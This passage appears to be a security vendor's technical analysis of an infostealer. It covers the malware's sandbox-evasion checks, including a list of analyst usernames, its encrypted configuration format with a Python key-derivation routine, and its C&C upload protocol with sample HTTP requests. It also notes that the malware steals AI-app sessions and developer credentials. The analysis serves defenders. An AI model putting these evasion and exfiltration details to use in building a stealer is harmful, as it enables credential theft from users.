A low number of running processes.

Suspicious usernames and computer names.

Display characteristics and available hardware resources.

The malware also checks usernames and computer names against strings commonly associated with test or analysis environments. The inspected strings include:

"sandbox", "malware", "virus", "sample", "test", "user", "admin", "CurrentUser", "John", "Peter", "JOHN", "John Doe", "WDAGUtilityAccount"

Additional checks monitor cursor movement and the number of running processes. These signals may help the malware identify automated analysis environments.

Configuration

The encrypted configuration blob is stored in the .stgcfg section. It begins with a four-byte magic value STGC, followed by the ciphertext length, a 16-byte initialization vector (IV) used for AES-CBC decryption, and the encrypted configuration data.

struct EncryptedConfigBlob { DWORD magic; // Four-byte configuration magic DWORD ciphertext_len; // Encrypted configuration size in bytes BYTE iv[0x10]; // 16-byte AES-CBC initialization vector BYTE ciphertext[]; // Encrypted configuration data };

The AES IV is stored in the .stgcfg section, while the malware derives the AES key from a specific seed using the algorithm below. The routine produces a 32-byte key used to decrypt the configuration with AES-256-CBC.

""" Author: @Tera0017/Check Point Research """ def decrypt_aes_key(seed: int, length: int = 32) -> bytes: key = bytearray() for i in range(length): seed ^= (seed >> (8 * (i & 3))) & 0xFF seed = (seed * 0x01000193) & 0xFFFFFFFF seed ^= seed >> 16 key.append(seed & 0xFF) return bytes(key)

The decrypted configuration contains the command-and-control (C&C) URL, the server’s X25519 public key, a build ID, and a gate token used for communication. It also includes a module bitmask that controls which capabilities are executed, flags for language and analysis-environment checks, TLS certificate pinning settings, and up to three fallback URLs.

struct DecryptedConfig { char base_url[0x100]; BYTE server_x25519_public_key[0x20]; char build_id[0x20]; char gate_token[0x40]; DWORD module_mask; BYTE unk_184[0x404]; BYTE language_check; BYTE analysis_environment_check; BYTE unk_58A; BYTE tls_certificate_sha256[0x20]; BYTE tls_pin_enabled; BYTE fallback_urls[3][0x100]; BYTE fallback_count; };

The malware uses the module_mask bitmask in its configuration to control which built-in capabilities are executed. Each entry in the module-dispatch table contains a function pointer and an associated feature mask. During dispatch, the malware performs a bitwise AND between module_mask and the entry’s feature mask. A nonzero result selects the corresponding function for execution.

All module implementations remain embedded in the executable, even when disabled in the configuration.

Network

The malware retrieves its C&C connection settings from the decrypted configuration. It uses the /gate path as the base for three endpoints that handle session establishment, stolen data uploads, and session completion.

Path

Description

/gate/handshake

Establishes an upload session by sending the client’s raw 32-byte X25519 public key. The malware requires an HTTP 200 response before enabling uploads.

/gate/chunk

Uploads collected information packaged into ZIP archives and encrypted using AES-256-GCM. Each request body contains a 12-byte nonce, ciphertext, and a 16-byte authentication tag. Headers identify the upload label and sequence number.

/gate/complete

Signals the end of the upload phase by sending the eight-byte marker COMPLETE. The malware expects an HTTP 200 response and subsequently performs local session cleanup. This notification does not independently establish that every upload succeeded.

The stealer generates an X25519 key pair consisting of a public key and a private key. It then computes a shared secret using its private key and the server_x25519_public_key stored in the decrypted configuration. The malware derives the communication encryption key from this shared secret using SHA-256 and the fixed string aokigahara. The resulting 32-byte key is used for AES-GCM encryption.

/handshake

The initial handshake registers the upload session with the C&C server and sends the client’s 32-byte X25519 public key in the request body. The request headers include the build ID, gate token, session ID, hardware identifier, and key exchange algorithm.

POST /gate/handshake HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: cae87a25 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e X-Session: ca47b44161834cb70a224dbe3d92a383 X-HWID: 69B506A1 X-KEX: x25519 Content-Length: 32 Host: $SERVER $CLIENT_X25519_PUBLIC_KEY

/chunk

For each executed collection module, the malware uploads an AES-GCM-encrypted ZIP archive to /gate/chunk. The X-Chunk header identifies the type of stolen data, using module labels such as sysinfo, browsers, firefox, or aisessions. The X-Chunk-Index header identifies the upload’s sequence number, which is also included in the request body.

The malware allocates an upload buffer with a size equal to the ZIP archive’s size plus 28 bytes. The buffer begins with a 12-byte AES-GCM nonce, formed by combining the four-byte little-endian chunk index with eight randomly generated bytes. The encrypted ZIP archive follows the nonce, and a 16-byte AES-GCM authentication tag is appended at the end.

POST /gate/chunk HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Chunk: sysinfo X-Chunk-Index: 0 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Total: 19 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 3233 Host: $SERVER \x00\x00\x00\x00$RANDOM_8_BYTES || $AES_GCM_CIPHERTEXT || $GCM_AUTH_TAG_16_BYTES

The next example uploads screenshot data with a chunk index of 1. The request body begins with \x01\x00\x00\x00.

POST /gate/chunk HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Chunk: screenshot X-Chunk-Index: 1 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Total: 19 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 10066 Host: $SERVER \x01\x00\x00\x00$RANDOM_8_BYTES || $AES_GCM_CIPHERTEXT || $GCM_AUTH_TAG_16_BYTES

/complete

After uploading all ZIP archives, the malware sends a final HTTP POST request to /gate/complete on the C&C server. The request body contains the eight-byte message COMPLETE, indicating that the upload process has finished.

POST /gate/complete HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 8 Host: $SERVER COMPLETE

The stealer appears to be under active development, with changes to its HTTP User-Agent string observed across versions. The latest analyzed samples use Microsoft-CryptoAPI/10.0 for communication with the server.

Conclusion

The malware retains the broad collection capabilities expected of an infostealer, but its dedicated targeting of AI applications and developer tools is particularly notable. By collecting authentication files, application storage, Git credentials, SSH-related files, and cloud configuration data, it reaches beyond traditional consumer accounts into AI-assisted development and cloud environments.

The targeting of AI sessions creates a potential route to monetization through unauthorized use of paid services or the resale of compromised access. It may also create opportunities for data extortion. Users can share sensitive business information, proprietary source code, and other confidential material with AI services. If stolen credentials or session tokens provide access to conversation histories or uploaded files, attackers could potentially threaten to disclose that information to demand payment.

The key finding is that AI application credentials and session data are part of this malware’s collection scope and should be treated as sensitive assets alongside browser sessions, cloud credentials, and developer keys.
